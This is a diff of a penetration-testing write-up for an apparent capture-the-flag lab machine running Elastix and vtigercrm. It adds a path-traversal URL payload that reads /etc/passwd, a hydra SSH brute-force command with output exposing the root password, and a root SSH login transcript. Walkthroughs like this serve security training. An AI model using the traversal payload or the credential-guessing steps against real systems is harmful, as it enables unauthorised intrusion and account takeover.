@@ -363,4 +363,40 @@ ASTRUNDIR=/var/run/asterisk
 ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
 ```
 
-From here, the Elastix credentials are user `admin` and password `jEhdIekWmdjE`.
+From here, the Elastix credentials are user `admin` and password `jEhdIekWmdjE`. I was not able to get much from the admin panel.
+
+Get the passwd file to list users of the system:
+`https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action`
+
+From the passwd file is possible to get usernames, and from the config file passwords. Then it is possible to use hydra to check for matches:
+```
+hydra -L users.txt -P pass.txt 10.10.10.7 -t 4 ssh
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-25 19:25:19
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 280 login tries (l:35/p:8), ~70 tries per task
+[DATA] attacking ssh://10.10.10.7:22/
+[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE
+[STATUS] 28.00 tries/min, 28 tries in 00:01h, 252 to do in 00:10h, 4 active
+[STATUS] 30.67 tries/min, 92 tries in 00:03h, 188 to do in 00:07h, 4 active
+```
+
+The ssh password for user `root` is `jEhdIekWmdjE`.
+
+Log in as root using ssh:
+```
+$ sudo ssh root@10.10.10.7 -oKexAlgorithms=+diffie-hellman-group1-sha1 
+root@10.10.10.7's password: 
+Last login: Wed Aug 26 02:44:10 2020 from 10.10.14.32
+
+Welcome to Elastix 
+----------------------------------------------------
+
+To access your Elastix System, using a separate workstation (PC/MAC/Linux)
+Open the Internet Browser using the following URL:
+http://10.10.10.7
+
+[root@beep ~]# whoami
+root
+```
+
